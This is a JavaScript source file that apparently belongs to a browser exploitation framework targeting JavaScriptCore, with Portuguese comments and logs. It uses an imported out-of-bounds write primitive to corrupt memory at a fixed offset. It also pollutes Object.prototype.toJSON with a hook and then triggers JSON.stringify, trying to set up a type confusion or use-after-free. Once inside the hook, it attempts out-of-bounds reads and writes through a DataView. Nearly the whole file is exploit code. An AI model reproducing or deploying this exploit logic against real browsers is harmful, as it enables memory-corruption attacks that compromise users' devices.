// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const EXPLOIT_TC_PARAMS = {
    victim_ab_original_size: 64,
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
    value_to_write_for_corruption: 0xFFFFFFFF,
    bytes_to_write_for_corruption: 4,
    ppKey: 'toJSON',
    description: "VerifyAndExploitThisConfusion_0x70_FFFF"
};

export let callCount_toJSON_exploit_tc = 0;
let victim_ab_for_this_context_ref = null; // Referência ao ArrayBuffer que esperamos que 'this' se torne

export function toJSON_VerifyAndExploitThisConfusion() {
    const FNAME_toJSON_local = `toJSON_VerifyExploitThis(Call ${++callCount_toJSON_exploit_tc})`;
    document.title = `toJSON_VerifyExploitThis Call ${callCount_toJSON_exploit_tc}`;
    const currentOperationThis = this;

    logS3(`[PP - VerifyExploitThis] ${FNAME_toJSON_local} Chamado!`, "vuln");
    logS3(`  [CALL ${callCount_toJSON_exploit_tc}] typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}, toString: ${Object.prototype.toString.call(currentOperationThis)}`, "info");

    let tc_exploitation_results = {
        type_confusion_confirmed_victim_ab: false,
        type_confusion_is_arraybuffer: false,
        observed_byteLength: "N/A",
        dataview_created: false,
        oob_read_attempt_offset: EXPLOIT_TC_PARAMS.victim_ab_original_size + 16, // Ex: 64 + 16 = 80
        oob_read_value: "N/A",
        oob_write_attempt_offset: EXPLOIT_TC_PARAMS.victim_ab_original_size + 32, // Ex: 64 + 32 = 96
        oob_write_success: false
    };

    try {
        // VERIFICAÇÃO CRUCIAL DA TYPE CONFUSION
        if (victim_ab_for_this_context_ref && currentOperationThis === victim_ab_for_this_context_ref) {
            logS3(`  [CALL ${callCount_toJSON_exploit_tc}] !!! TYPE CONFUSION CONFIRMADA !!! 'this' (referência) é victim_ab_for_this_context_ref. Tentando explorar...`, "critical");
            document.title = `TC CONFIRMADA (REF)! Call ${callCount_toJSON_exploit_tc}`;
            tc_exploitation_results.type_confusion_confirmed_victim_ab = true;
            tc_exploitation_results.type_confusion_is_arraybuffer = true; // Se é a ref, é AB
        } else if (currentOperationThis instanceof ArrayBuffer) {
            logS3(`  [CALL ${callCount_toJSON_exploit_tc}] !!! TYPE CONFUSION POTENCIAL !!! 'this' é um ArrayBuffer (mas não a referência esperada). byteLength: ${currentOperationThis.byteLength}. Tentando explorar...`, "vuln");
            document.title = `TC POTENCIAL (AB)! Call ${callCount_toJSON_exploit_tc}`;
            tc_exploitation_results.type_confusion_is_arraybuffer = true;
        } else {
            logS3(`  [CALL ${callCount_toJSON_exploit_tc}] 'this' NÃO é um ArrayBuffer. Nenhuma exploração de AB tentada nesta chamada. Saindo da toJSON.`, "info");
            return { tc_this_not_ab: true, call: callCount_toJSON_exploit_tc, final_this_type: Object.prototype.toString.call(currentOperationThis) };
        }

        // Se 'this' é (ou parece ser) um ArrayBuffer, prosseguir com a tentativa de exploração
        if (tc_exploitation_results.type_confusion_is_arraybuffer) {
            tc_exploitation_results.observed_byteLength = currentOperationThis.byteLength;
            logS3(`    [TC Exploit] this.byteLength observado: ${tc_exploitation_results.observed_byteLength}`, "leak");

            if (typeof tc_exploitation_results.observed_byteLength === 'number') {
                if (tc_exploitation_results.observed_byteLength > EXPLOIT_TC_PARAMS.victim_ab_original_size) {
                    logS3(`    [TC Exploit] !!! SUCESSO UAF/TC PARCIAL !!! this.byteLength (${tc_exploitation_results.observed_byteLength}) > original (${EXPLOIT_TC_PARAMS.victim_ab_original_size})`, "critical");
                    document.title = `TC Exploit: byteLength=${tc_exploitation_results.observed_byteLength}`;
                }

                logS3(`    [TC Exploit] Tentando criar DataView sobre 'this' (tamanho ${tc_exploitation_results.observed_byteLength})...`, "info");
                try {
                    let confused_dv = new DataView(currentOperationThis);
                    tc_exploitation_results.dataview_created = true;
                    logS3(`    [TC Exploit] DataView criada sobre 'this' com tamanho ${confused_dv.byteLength}.`, "good");

                    if (confused_dv.byteLength >= tc_exploitation_results.oob_read_attempt_offset + 4) {
                        tc_exploitation_results.oob_read_value = confused_dv.getUint32(tc_exploitation_results.oob_read_attempt_offset, true);
                        logS3(`    [TC Exploit] LEITURA OOB de 'this' @ ${toHex(tc_exploitation_results.oob_read_attempt_offset)}: ${toHex(tc_exploitation_results.oob_read_value)}`, "leak");
                        document.title = `TC Read: ${toHex(tc_exploitation_results.oob_read_value)}`;
                    } else {
                        logS3(`    [TC Exploit] DataView pequena demais para leitura OOB em ${toHex(tc_exploitation_results.oob_read_attempt_offset)} (DV size: ${confused_dv.byteLength})`, "warn");
                    }

                    if (confused_dv.byteLength >= tc_exploitation_results.oob_write_attempt_offset + 4) {
                        const test_write_val = 0xFEEDBEEF;
                        confused_dv.setUint32(tc_exploitation_results.oob_write_attempt_offset, test_write_val, true);
                        let readback = confused_dv.getUint32(tc_exploitation_results.oob_write_attempt_offset, true);
                        if (readback === test_write_val) {
                            tc_exploitation_results.oob_write_success = true;
                            logS3(`    [TC Exploit] ESCRITA OOB em 'this' @ ${toHex(tc_exploitation_results.oob_write_attempt_offset)} VERIFICADA! Leu de volta: ${toHex(readback)}`, "critical");
                            document.title = "TC WRITE OK!";
                        } else {
                             logS3(`    [TC Exploit] Falha na verificação da escrita OOB em 'this' @ ${toHex(tc_exploitation_results.oob_write_attempt_offset)}. Leu ${toHex(readback)}, esperava ${toHex(test_write_val)}`, "error");
                        }
                    }
                } catch (e_dv_confused) {
                    logS3(`    [TC Exploit] ERRO ao criar/usar DataView em 'this': ${e_dv_confused.name} - ${e_dv_confused.message}`, "error");
                    tc_exploitation_results.dataview_created = `Erro DV: ${e_dv_confused.message}`;
                    document.title = "TC Exploit: ERRO DataView";
                }
            } else {
                 logS3(`    [TC Exploit] this.byteLength (${tc_exploitation_results.observed_byteLength}) não é numérico ou é inválido. Não tentando DataView.`, "warn");
            }
        }
        return { toJSON_VerifyAndExploitThisConfusion_results: true, call: callCount_toJSON_exploit_tc, results: tc_exploitation_results };
    } catch (e_main_toJSON) {
        logS3(`  [CALL ${callCount_toJSON_exploit_tc}] ERRO GERAL em toJSON_VerifyAndExploitThisConfusion: ${e_main_toJSON.name} - ${e_main_toJSON.message}`, "critical");
        document.title = `ERRO GERAL toJSON_VerifyExploitThis Call ${callCount_toJSON_exploit_tc}`;
        throw new Error(`Erro Geral em toJSON_VerifyAndExploitThisConfusion Call ${callCount_toJSON_exploit_tc}: ${e_main_toJSON.message}`);
    }
}

export async function executeVerifyAndExploitThisConfusionAttempt() { // Nome da função de teste atualizado
    const FNAME_TEST_RUNNER = EXPLOIT_TC_PARAMS.description;
    logS3(`--- Iniciando ${FNAME_TEST_RUNNER} ---`, "test", FNAME_TEST_RUNNER);
    document.title = `Iniciando ${FNAME_TEST_RUNNER}`;

    callCount_toJSON_exploit_tc = 0;
    victim_ab_for_this_context_ref = null; // Resetar referência global

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST_RUNNER);
        return { errorOccurred: new Error("OOB Setup Failed"), calls: 0, potentiallyCrashed: false, stringifyResult: null };
    }
    document.title = `OOB OK - ${FNAME_TEST_RUNNER}`;

    // Este é o ArrayBuffer que esperamos que 'this' se torne na toJSON
    victim_ab_for_this_context_ref = new ArrayBuffer(EXPLOIT_TC_PARAMS.victim_ab_original_size);
    logS3(`victim_ab_for_this_context_ref (${EXPLOIT_TC_PARAMS.victim_ab_original_size}b) criado. (Este é o que esperamos que 'this' seja na toJSON)`, "info", FNAME_TEST_RUNNER);

    // O objeto que será efetivamente passado para JSON.stringify (um objeto simples)
    let object_to_stringify = { simple_prop: "trigger_VerifyAndExploitThisConfusion_toJSON" };
    logS3(`object_to_stringify criado: ${JSON.stringify(object_to_stringify)} (Este stringify usa toJSON nativo, se houver)`, "info", FNAME_TEST_RUNNER);

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, EXPLOIT_TC_PARAMS.ppKey);
    let pollutionApplied = false;
    let stepReached = "antes_pp";
    let potentiallyCrashed = true;
    let errorCaptured = null;
    let stringifyResult = null;

    try {
        stepReached = "aplicando_pp";
        logS3(`Poluindo Object.prototype.${EXPLOIT_TC_PARAMS.ppKey} com toJSON_VerifyAndExploitThisConfusion...`, "info", FNAME_TEST_RUNNER);
        document.title = `Aplicando PP VerifyExploitThis - ${FNAME_TEST_RUNNER}`;
        Object.defineProperty(Object.prototype, EXPLOIT_TC_PARAMS.ppKey, {
            value: toJSON_VerifyAndExploitThisConfusion,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`PP aplicada com toJSON_VerifyAndExploitThisConfusion.`, "good", FNAME_TEST_RUNNER);
        stepReached = "pp_aplicada";
        document.title = `PP VerifyExploitThis OK - ${FNAME_TEST_RUNNER}`;

        stepReached = "antes_escrita_oob";
        logS3(`CORRUPÇÃO: ${toHex(EXPLOIT_TC_PARAMS.value_to_write_for_corruption)} @ ${toHex(EXPLOIT_TC_PARAMS.corruption_offset)}`, "warn", FNAME_TEST_RUNNER);
        document.title = `Antes OOB Write VerifyExploitThis - ${FNAME_TEST_RUNNER}`;
        oob_write_absolute(EXPLOIT_TC_PARAMS.corruption_offset, EXPLOIT_TC_PARAMS.value_to_write_for_corruption, EXPLOIT_TC_PARAMS.bytes_to_write_for_corruption);
        logS3("Escrita OOB feita.", "info", FNAME_TEST_RUNNER);
        stepReached = "apos_escrita_oob";
        document.title = `Após OOB Write VerifyExploitThis - ${FNAME_TEST_RUNNER}`;

        await PAUSE_S3(SHORT_PAUSE_S3);

        stepReached = "antes_stringify_obj_simples";
        document.title = `Antes Strfy Obj Simples - ${FNAME_TEST_RUNNER}`;
        logS3(`Chamando JSON.stringify(object_to_stringify) (Esperando que 'this' na toJSON seja victim_ab_for_this_context_ref)...`, "info", FNAME_TEST_RUNNER);
        
        try {
            stringifyResult = JSON.stringify(object_to_stringify);
            stepReached = `apos_stringify_obj_simples`;
            potentiallyCrashed = false;
            document.title = `Strfy Obj Simples OK - ${FNAME_TEST_RUNNER}`;
            logS3(`Resultado JSON.stringify(object_to_stringify): ${String(stringifyResult).substring(0, 300)}... (Chamadas toJSON: ${callCount_toJSON_exploit_tc})`, "info", FNAME_TEST_RUNNER);
        } catch (e) {
            stepReached = `erro_stringify_obj_simples`;
            potentiallyCrashed = false;
            errorCaptured = e;
            document.title = `ERRO Strfy Obj Simples (${e.name}) - ${FNAME_TEST_RUNNER}`;
            logS3(`ERRO CAPTURADO JSON.stringify(object_to_stringify): ${e.name} - ${e.message}. (Chamadas toJSON: ${callCount_toJSON_exploit_tc})`, "critical", FNAME_TEST_RUNNER);
            console.error(`JSON.stringify ERROR for object_to_stringify (VerifyExploitThis):`, e);
        }
    } catch (mainError) {
        potentiallyCrashed = false;
        errorCaptured = mainError;
        logS3(`Erro principal: ${mainError.message}`, "error", FNAME_TEST_RUNNER);
        document.title = "ERRO Principal VerifyExploitThis - " + FNAME_TEST_RUNNER;
        console.error("Main VerifyExploitThis test error:", mainError);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, EXPLOIT_TC_PARAMS.ppKey, originalToJSONDescriptor);
            else delete Object.prototype[EXPLOIT_TC_PARAMS.ppKey];
        }
        victim_ab_for_this_context_ref = null; // Limpar referência
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}`, "info", FNAME_TEST_RUNNER);
        if (potentiallyCrashed) {
             document.title = `CONGELOU? ${stepReached} - ${FNAME_TEST_RUNNER}`;
             logS3(`O TESTE PODE TER CONGELADO/CRASHADO em ${stepReached}. Chamadas toJSON: ${callCount_toJSON_exploit_tc}`, "error", FNAME_TEST_RUNNER);
        }
    }
    logS3(`--- Tentativa de Verificação e Exploração de Type Confusion Concluída: ${FNAME_TEST_RUNNER} (Chamadas toJSON: ${callCount_toJSON_exploit_tc}) ---`, "test", FNAME_TEST_RUNNER);
    if (!potentiallyCrashed && !errorCaptured) {
        document.title = `Teste VerifyExploitThis OK - ${FNAME_TEST_RUNNER}`;
    } else if (errorCaptured) {
        // Título já reflete erro
    }
    return { potentiallyFroze: potentiallyCrashed, errorOccurred: errorCaptured, calls: callCount_toJSON_exploit_tc, stringifyResult };
}
